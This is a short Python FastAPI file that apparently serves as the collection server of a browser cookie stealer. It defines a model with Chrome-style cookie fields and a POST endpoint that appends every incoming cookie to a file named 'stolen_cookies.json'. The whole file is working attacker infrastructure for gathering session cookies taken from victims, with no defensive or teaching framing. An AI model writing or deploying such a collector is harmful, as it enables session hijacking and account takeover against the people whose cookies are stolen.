from fastapi import FastAPI
from pydantic import BaseModel
import json

app = FastAPI()


class Cookie(BaseModel):
    host: str
    name: str
    value: str
    creation_utc: str
    last_access_utc: str
    expires_utc: str


@app.post("/cookies")
async def create_cookie(cookie: Cookie):
    with open("server/stolen_cookies.json", "a") as f:
        f.write(json.dumps(cookie.dict()))
        f.write("\n")
    return cookie
